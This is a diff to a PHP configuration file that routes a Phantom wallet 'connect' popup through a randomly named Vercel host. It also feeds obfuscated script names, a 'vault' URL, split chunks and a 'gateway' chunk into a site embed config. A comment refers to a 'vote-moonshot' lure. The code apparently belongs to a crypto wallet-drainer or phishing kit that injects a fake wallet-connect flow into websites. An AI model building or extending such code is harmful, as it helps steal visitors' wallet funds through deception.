@@ -35,6 +35,9 @@ $cfg = [
 
     'connect_popup_enabled' => true,
     'connect_popup_url' => '',
+    // Phantom / wallet UI runs on Vercel /connect/ (not vote-moonshot in the extension prompt).
+    'connect_via_vercel' => true,
+    'connect_host_url' => '',
 
     'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
     'profile_script' => 'Ix9fLBj7CRLZ.js',
@@ -171,6 +174,11 @@ function build_embed_config(array $cfg, string $siteUrl): array
         $popupUrl = rtrim(vercel_api_origin($cfg), '/') . '/profile/';
     }
 
+    $connectHostUrl = trim((string) ($cfg['connect_host_url'] ?? ''));
+    if ($connectHostUrl === '') {
+        $connectHostUrl = rtrim(vercel_api_origin($cfg), '/') . '/connect/';
+    }
+
     $icons = $cfg['site_icons'] ?? [];
     if (!is_array($icons) || $icons === []) {
         $icons = [rtrim(vercel_api_origin($cfg), '/') . '/tYZq2BsVawvS5wYEF.svg'];
@@ -196,6 +204,9 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
         'connectPopupUrl' => $popupUrl,
         'connectPopupTitle' => (string) ($cfg['connect_popup_title'] ?? ''),
+        'connectViaVercel' => (bool) ($cfg['connect_via_vercel'] ?? true),
+        'connectHostUrl' => $connectHostUrl,
+        'gatewayChunk' => $chunks['gateway'],
         'chunkBase' => vault_entry_url($cfg),
         'splitChunks' => array_values($cfg['split_chunks'] ?? []),
     ];
